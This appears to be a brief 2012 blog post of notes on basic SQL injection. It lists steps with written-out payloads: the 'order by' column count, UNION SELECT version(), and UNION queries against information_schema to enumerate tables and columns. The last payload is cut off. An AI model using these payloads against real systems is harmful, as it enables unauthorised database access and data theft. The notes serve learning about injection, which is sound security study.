---
layout: post
title: "basic sql injection"
date: 2012-10-04 17:18:44
tags: ["sql", "sql", "injection"]
---

```sql
SELECT user
FROM users 
WHERE user.name = 'jeffrey';
```


1. FIND NUMBER OF COLUMNS  
	"order by" trick - test if you can order by a column number

2. NOW WE CAN DO A UNION (# OF COLUMNS MUST MATCH)  
	' union select 1,2,3,version() -- -

3. NOW WE CAN GET TABLE, COLUMN, AND DATABASE INFO  
	' union select 1,2,3,table_name from information_schema.tables where table_schema="x8250" -- -  
  ' union select 1,2,3,column_name from information_schema.columns where table...
